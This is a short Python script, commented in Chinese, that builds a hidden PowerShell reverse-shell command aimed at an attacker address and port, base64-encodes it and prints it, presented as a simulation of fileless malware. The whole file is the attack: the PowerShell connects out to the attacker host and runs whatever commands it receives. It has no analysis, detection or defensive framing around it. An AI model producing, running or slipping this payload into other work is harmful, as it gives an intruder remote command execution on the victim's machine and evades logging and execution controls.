import os
import base64

# 假設攻擊者的IP和端口
attacker_ip = "192.168.1.100"
attacker_port = "4444"

# 建立一個反向 PowerShell Shell 命令
powershell_command = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}', {attacker_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{ $data = (New-Object Text.Encoding.ASCII).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII.GetBytes($sendback2));$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()}}$client.Close()\""

# 使用 base64 編碼
encoded_command = base64.b64encode(powershell_command.encode('utf-8')).decode('utf-8')

# 模擬攻擊者利用無檔案惡意軟件執行反向 Shell
print(f"Encoded PowerShell Command: {encoded_command}")
